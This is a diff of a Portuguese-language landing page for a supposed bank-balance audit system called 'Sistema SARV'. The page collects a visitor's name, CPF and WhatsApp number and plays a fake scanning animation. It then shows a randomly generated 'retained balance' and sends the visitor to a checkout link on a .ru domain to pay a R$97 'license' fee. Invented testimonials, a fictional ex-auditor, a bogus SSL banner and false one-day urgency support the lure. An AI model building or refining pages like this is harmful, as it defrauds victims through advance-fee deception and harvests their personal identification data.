@@ -3,162 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistema SARV - Auditoria e Verificação</title>
+    <title>Sistema SARV - Auditoria Oficial</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
         :root { 
-            --primary: #111111; /* Preto */
-            --secondary: #16a34a; /* Verde Sucesso */
-            --accent: #c5a059; /* Dourado Premium */
+            --primary: #004ead; 
+            --secondary: #16a34a; 
             --text: #1a1a1a; 
-            --bg: #ffffff; 
+            --bg: #f4f7f9; 
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background-color: #f8f9fa; color: var(--text); overflow-x: hidden; }
+        body { background-color: var(--bg); color: var(--text); overflow-x: hidden; }
 
-        /* Barra de Segurança SSL */
+        /* BARRA SSL ADICIONADA */
         .ssl-bar { background: #e2e8f0; color: #475569; padding: 6px; text-align: center; font-size: 10px; font-weight: 700; display: flex; justify-content: center; align-items: center; gap: 8px; }
 
-        .navbar { background: var(--primary); padding: 15px; border-bottom: 2px solid var(--accent); display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-weight: 900; color: #fff; font-size: 16px; letter-spacing: -1px; }
-        .logo span { color: var(--accent); }
+        .top-alert { background: #f59e0b; color: #000; padding: 12px; text-align: center; font-size: 11px; font-weight: 800; text-transform: uppercase; z-index: 999; position: relative; border-bottom: 1px solid #d97706; }
+        .navbar { background: var(--primary); padding: 15px; border-bottom: 2px solid #003070; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .logo { font-weight: 900; color: #fff; font-size: 18px; display: flex; align-items: center; gap: 5px; }
+        .status-online { color: #fff; font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
+        .dot { width: 8px; height: 8px; background: #00ff41; border-radius: 50%; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
         .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
-        /* Hero Institucional */
-        .hero { text-align: center; margin-bottom: 25px; padding: 10px; }
-        .hero h1 { font-size: 24px; font-weight: 900; line-height: 1.2; color: var(--primary); }
-        .hl-gold { color: var(--accent); }
+        .hero { text-align: center; margin-bottom: 20px; }
+        .hero h1 { font-size: 26px; font-weight: 900; line-height: 1.1; color: #111; margin-top: 15px; }
+        .hl-blue { color: var(--primary); }
 
-        /* Video Fake Reportagem */
-        .video-container { width: 100%; background: #000; border-radius: 15px; margin-bottom: 20px; position: relative; overflow: hidden; border: 3px solid var(--accent); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
-        .video-placeholder { width: 100%; aspect-ratio: 16/9; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; background: linear-gradient(45deg, #111, #333); }
-        .play-btn { font-size: 50px; color: var(--accent); opacity: 0.9; }
+        /* VIDEO PLACEHOLDER */
+        .video-box { width: 100%; background: #000; border-radius: 15px; margin-bottom: 20px; aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center; color: #fff; border: 2px solid var(--primary); }
 
-        /* Form Card Premium */
-        .form-card { background: #fff; border-radius: 20px; padding: 25px; border: 1px solid #e5e7eb; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
-        .form-card h2 { font-size: 18px; text-align: center; margin-bottom: 20px; font-weight: 800; color: var(--primary); }
+        .roberto-box { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #ddd; margin-bottom: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .roberto-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+        .roberto-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #eee; object-fit: cover; }
+        .roberto-info b { font-size: 16px; display: block; color: #111; }
+        .roberto-info span { font-size: 11px; font-weight: 700; color: #777; }
+        .roberto-text { font-size: 14px; color: #444; line-height: 1.5; font-weight: 500; font-style: italic; border-left: 3px solid var(--primary); padding-left: 10px; }
+
+        .form-card { background: #fff; border-radius: 20px; padding: 25px; border: 1px solid #ddd; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+        .form-card h2 { font-size: 19px; text-align: center; margin-bottom: 20px; font-weight: 900; color: var(--secondary); }
         .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 10px; font-weight: 800; color: #666; margin-bottom: 5px; text-transform: uppercase; }
-        input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #ddd; font-size: 15px; font-weight: 600; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--accent); }
-        
-        .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 20px; border: none; border-radius: 8px; font-size: 16px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 0 #118a3a; }
+        label { display: block; font-size: 11px; font-weight: 800; color: #666; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; font-weight: 600; outline: none; background: #f9f9f9; }
+        .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 22px; border: none; border-radius: 12px; font-size: 16px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 0 #118a3a; text-transform: uppercase; margin-top: 10px; }
 
-        /* Bloco Como Funciona */
-        .section-title { font-weight: 900; font-size: 18px; margin: 30px 0 15px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .how-works { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #eee; }
-        .step { display: flex; gap: 15px; margin-bottom: 15px; align-items: center; }
-        .step-n { background: var(--accent); color: #fff; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 14px; }
-        .step-t { font-size: 13px; font-weight: 700; color: #444; }
-
-        /* Comentários Estilo FB */
-        .fb-comments { background: #fff; border-radius: 15px; padding: 15px; margin-top: 30px; border: 1px solid #eee; }
-        .comment { margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #f0f0f0; }
-        .comment-header { display: flex; gap: 10px; align-items: center; margin-bottom: 5px; }
-        .u-img { width: 36px; height: 36px; border-radius: 50%; }
-        .u-name { font-size: 13px; font-weight: 700; color: #385898; }
-        .c-text { font-size: 13px; color: #1c1e21; line-height: 1.4; }
-        .c-info { font-size: 11px; color: #90949c; margin-top: 5px; font-weight: 600; }
-
-        /* Etapa de Carregamento Progressivo */
-        .loading-steps { text-align: left; margin-top: 20px; }
-        .l-item { font-size: 12px; padding: 8px 0; border-bottom: 1px solid #f1f1f1; display: flex; justify-content: space-between; font-weight: 600; color: #666; }
-        .l-item.active { color: var(--accent); }
+        /* PROGRESSIVO STYLE */
+        .l-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; font-weight: 700; color: #888; }
         .l-item.done { color: var(--secondary); }
 
-        .result-card { background: #fff; border: 2px solid var(--accent); padding: 25px; border-radius: 20px; text-align: center; margin: 20px 0; }
-        
-        /* Rodapé Empresa */
-        .footer-premium { background: #111; color: #777; padding: 40px 20px; text-align: center; font-size: 10px; margin-top: 50px; }
-        .footer-links { margin-bottom: 20px; display: flex; justify-content: center; gap: 15px; }
-        .footer-links a { color: #aaa; text-decoration: none; font-weight: 700; }
+        /* COMENTARIOS FB */
+        .fb-comments { background: #fff; border-radius: 15px; padding: 15px; margin-top: 25px; border: 1px solid #ddd; }
+        .comment { margin-bottom: 15px; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px; }
+        .u-name-fb { color: #385898; font-weight: 700; font-size: 13px; }
+        .c-text-fb { font-size: 13px; color: #1c1e21; margin: 4px 0; }
 
-        .loader-circle { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--accent); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+        .result-card { background: #f0fff4; border: 2px dashed var(--secondary); padding: 30px 20px; border-radius: 20px; margin: 15px 0; text-align: center; }
+        .result-card h3 { font-size: 44px; font-weight: 900; color: #111; }
+        
+        .footer { text-align: center; padding: 40px 20px; font-size: 11px; color: #999; border-top: 1px solid #ddd; line-height: 1.6; }
+        .loader-circle { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--primary); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="ssl-bar">
-        <i class="fas fa-lock"></i> CONEXÃO CRIPTOGRAFADA SSL 256-BIT · PROTOCOLO DE SEGURANÇA ATIVO
-    </div>
+    <div class="ssl-bar"><i class="fas fa-lock"></i> DADOS CRIPTOGRAFIADOS E CONEXÃO SEGURA SSL</div>
+    <div class="top-alert">⚠️ Liberação extraordinária — Sistema disponível APENAS HOJE (11 de maio de 2026)</div>
 
     <nav class="navbar">
-        <div class="logo">SISTEMA <span>SARV</span></div>
-        <div style="color: #fff; font-size: 10px; font-weight: 800;"><i class="fas fa-headset" style="color: var(--accent);"></i> SUPORTE ON</div>
+        <div class="logo">🛡️ Sistema SARV</div>
+        <div class="status-online"><div class="dot"></div> ONLINE</div>
     </nav>
 
     <div class="container">
 
         <div id="step-1">
             <section class="hero">
-                <h1>Verifique se você possui <span class="hl-gold">Saldos Retidos</span> em Instituições Bancárias</h1>
-                <p style="font-size: 13px; color: #666; margin-top: 10px; font-weight: 600;">Tecnologia de Verificação Integrada via CPF</p>
+                <p style="font-size: 13px; font-weight: 800; color: #999;">Por: Roberto Mendes — Ex-Auditor Sênior</p>
+                <h1>Recupere o saldo que os bancos <span class="hl-blue">esconderam de você</span></h1>
             </section>
 
-            <div class="video-container">
-                <div class="video-placeholder">
-                    <i class="fas fa-play-circle play-btn"></i>
-                    <p style="margin-top: 10px; font-weight: 800; font-size: 12px; letter-spacing: 1px;">CLIQUE PARA ASSISTIR O PRONUNCIAMENTO</p>
-                </div>
+            <div class="video-box">
+                <i class="fas fa-play-circle fa-3x"></i>
             </div>
 
-            <div class="form-card">
-                <h2>Painel de Auditoria Individual</h2>
+            <div class="form-card" id="main-form">
+                <h2>Consulta Grátis Liberada</h2>
                 <div class="input-group">
-                    <label>Titular da Conta</label>
-                    <input type="text" id="nome" placeholder="Nome Completo">
+                    <label>SEU NOME COMPLETO</label>
+                    <input type="text" id="nome" placeholder="Nome do titular...">
                 </div>
                 <div class="input-group">
-                    <label>CPF para Varredura</label>
+                    <label>CPF PARA A CONSULTA</label>
                     <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
                 </div>
                 <div class="input-group">
-                    <label>WhatsApp de Recebimento</label>
+                    <label>WHATSAPP PARA RECEBER O PIX</label>
                     <input type="tel" id="zap" placeholder="(00) 00000-0000">
                 </div>
-                <button class="btn-main" onclick="startScanner()">🔍 INICIAR VERIFICAÇÃO GRATUITA</button>
-            </div>
-
-            <h3 class="section-title">Como funciona?</h3>
-            <div class="how-works">
-                <div class="step">
-                    <div class="step-n">1</div>
-                    <div class="step-t">Varredura profunda em 14 bancos nacionais.</div>
-                </div>
-                <div class="step">
-                    <div class="step-n">2</div>
-                    <div class="step-t">Cálculo de tarifas e juros retidos indevidamente.</div>
-                </div>
-                <div class="step">
-                    <div class="step-n">3</div>
-                    <div class="step-t">Liberação de Licença e Saque imediato via PIX.</div>
-                </div>
+                <button class="btn-main" onclick="startScanner()">🔍 CONSULTAR MEU SALDO AGORA</button>
             </div>
 
             <div class="fb-comments">
-                <p style="font-size: 12px; font-weight: 800; color: #4b4f56; margin-bottom: 15px;">247 comentários</p>
-                
+                <p style="font-weight: 800; font-size: 12px; margin-bottom: 10px;">Comentários (142)</p>
                 <div class="comment">
-                    <div class="comment-header">
-                        <img src="https://i.pravatar.cc/100?u=a1" class="u-img">
-                        <b class="u-name">Marcos Oliveira</b>
-                    </div>
-                    <p class="c-text">Gente, realmente funciona. Achei que era mentira, mas o Roberto explicou tudo no vídeo e eu recebi 2.400 que tava parado.</p>
-                    <div class="c-info">Responder · Curtir · 4 min</div>
+                    <b class="u-name-fb">Marcos Silva</b>
+                    <p class="c-text-fb">Gente, realmente caiu aqui. Achei que era balela, mas recebi R$ 2.100. Valeu demais!</p>
                 </div>
-
                 <div class="comment">
-                    <div class="comment-header">
-                        <img src="https://i.pravatar.cc/100?u=a2" class="u-img">
-                        <b class="u-name">Sandra Helena</b>
-                    </div>
-                    <p class="c-text">O meu deu R$ 1.120,00. Paguei a licença e caiu no pix em menos de 10 minutos. Muito bom!</p>
-                    <div class="c-info">Responder · Curtir · 12 min</div>
+                    <b class="u-name-fb">Dona Maria Souza</b>
+                    <p class="c-text-fb">Deus abençoe, recebi meu valor do banco que trabalhei anos atrás.</p>
                 </div>
             </div>
         </div>
@@ -166,61 +124,44 @@
         <div id="step-2" style="display: none;">
             <div class="form-card" style="text-align: center;">
                 <div class="loader-circle"></div>
-                <h3 style="font-size: 18px; font-weight: 900;">Processando Auditoria...</h3>
-                
-                <div class="loading-steps">
-                    <div class="l-item" id="l1"><span>Iniciando Scanner...</span> <i class="fas fa-clock"></i></div>
-                    <div class="l-item" id="l2"><span>Consultando Banco Central...</span> <i class="fas fa-clock"></i></div>
-                    <div class="l-item" id="l3"><span>Validando Titularidade...</span> <i class="fas fa-clock"></i></div>
-                    <div class="l-item" id="l4"><span>Localizando Saldos Retidos...</span> <i class="fas fa-clock"></i></div>
-                    <div class="l-item" id="l5"><span>Finalizando Relatório...</span> <i class="fas fa-clock"></i></div>
+                <h3 style="font-size: 19px;">🔎 Processando Auditoria...</h3>
+                <div style="text-align: left; margin-top: 20px;">
+                    <div class="l-item" id="l1"><span>Buscando dados no sistema...</span> <i class="fas fa-clock"></i></div>
+                    <div class="l-item" id="l2"><span>Validando CPF e titularidade...</span> <i class="fas fa-clock"></i></div>
+                    <div class="l-item" id="l3"><span>Calculando juros retidos...</span> <i class="fas fa-clock"></i></div>
+                    <div class="l-item" id="l4"><span>Localizando saldo disponível...</span> <i class="fas fa-clock"></i></div>
                 </div>
             </div>
         </div>
 
         <div id="step-3" style="display: none;">
             <div class="form-card">
-                <div style="background: #f0fdf4; color: #15803d; padding: 10px; border-radius: 8px; font-weight: 800; font-size: 13px; text-align: center; border: 1px solid #bbf7d0;">
-                    <i class="fas fa-check-circle"></i> AUDITORIA CONCLUÍDA COM SUCESSO
+                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; margin-bottom: 20px;">
+                    ✅ CONSULTA CONCLUÍDA!
                 </div>
 
                 <div class="result-card">
-                    <p style="font-size: 11px; font-weight: 800; color: #666; text-transform: uppercase;">Montante Localizado para Saque</p>
-                    <h2 id="f-money" style="font-size: 42px; font-weight: 900; color: var(--primary);">R$ 0,00</h2>
-                    <p style="font-size: 12px; color: var(--secondary); font-weight: 700; margin-top: 5px;">Status: Disponível para Transferência</p>
+                    <span style="font-size: 12px; font-weight: 800; color: var(--secondary);">💰 SALDO LOCALIZADO</span>
+                    <h3 id="f-money">R$ 0,00</h3>
                 </div>
 
-                <div style="padding: 15px; background: #fafafa; border-radius: 12px; margin-bottom: 20px;">
-                    <h4 style="font-size: 14px; margin-bottom: 10px; font-weight: 800;">Por que existe uma taxa?</h4>
-                    <p style="font-size: 12px; color: #555; line-height: 1.5;">
-                        Para garantir a segurança e a <b>emissão imediata</b> do seu Protocolo de Saque, o sistema requer o pagamento de uma <b>Licença de Uso Única</b>. Esse valor cobre os custos de processamento em nuvem e a verificação antifraude necessária para liberar valores acima de R$ 1.000,00.
-                    </p>
+                <div style="background: #f8fafc; padding: 15px; border-radius: 15px; margin-bottom: 20px; font-size: 13px;">
+                    <b style="display: block; margin-bottom: 5px;">Por que pagar a taxa?</b>
+                    A taxa de <b>R$ 97,00</b> refere-se à emissão da sua <b>Licença de Auditoria Individual</b> e custos de processamento do sistema para liberação imediata do valor via PIX.
                 </div>
 
-                <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="text-decoration: none; display: block; text-align: center; background: var(--secondary);">
-                    🔓 ATIVAR LICENÇA E RECEBER AGORA
-                </a>
-
-                <div style="text-align: center; margin-top: 15px;">
-                    <p style="font-size: 10px; color: #999; font-weight: 700;">PROCESSO PROTEGIDO POR CRIPTOGRAFIA DE PONTA A PONTA</p>
-                </div>
+                <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="text-decoration: none; display: block; text-align: center;">🔓 LIBERAR MEU SAQUE AGORA</a>
             </div>
         </div>
 
-        <footer class="footer-premium">
-            <div class="footer-links">
-                <a href="#">Termos de Uso</a>
-                <a href="#">Privacidade</a>
-                <a href="#">Suporte</a>
-            </div>
-            <p>SISTEMA SARV TECNOLOGIA LTDA</p>
-            <p>CNPJ: 42.184.291/0001-08</p>
-            <p style="margin-top: 10px;">Esta plataforma utiliza tecnologia de verificação criptográfica para auditoria de contas bancárias. Os valores são processados via gateways parceiros autorizados.</p>
+        <footer class="footer">
+            SISTEMA SARV TECNOLOGIA LTDA<br>
+            CNPJ: 42.184.291/0001-08<br>
+            © 2026 — Todos os direitos reservados.
         </footer>
     </div>
 
     <script>
-        // Mascara CPF
         document.getElementById('cpf').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 11) v = v.slice(0, 11);
@@ -230,31 +171,30 @@
         function startScanner() {
             const nome = document.getElementById('nome').value;
             const cpf = document.getElementById('cpf').value;
-            if(!nome || cpf.length < 14) { alert("Preencha os dados corretamente!"); return; }
+            if(!nome || cpf.length < 14) { alert("Preencha corretamente!"); return; }
 
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
-            window.scrollTo(0,0);
 
-            let step = 1;
+            let s = 1;
             const timer = setInterval(() => {
-                const current = document.getElementById('l' + step);
-                if(current) {
-                    current.classList.add('done');
-                    current.innerHTML = `<span>${current.innerText}</span> <i class="fas fa-check-circle" style="color:var(--secondary)"></i>`;
+                let el = document.getElementById('l'+s);
+                if(el) {
+                    el.classList.add('done');
+                    el.querySelector('i').className = "fas fa-check-circle";
                 }
-                step++;
-                if(step > 5) {
+                s++;
+                if(s > 4) {
                     clearInterval(timer);
-                    setTimeout(showResult, 800);
+                    setTimeout(showResult, 1000);
                 }
-            }, 1200);
+            }, 1500);
         }
 
         function showResult() {
-            const min = 1450;
-            const max = 3890.90;
-            const sorteio = (Math.random() * (max - min) + min).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const min = 1320;
+            const max = 3740.50;
+            const sorteio = (Math.random() * (max - min) + min).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
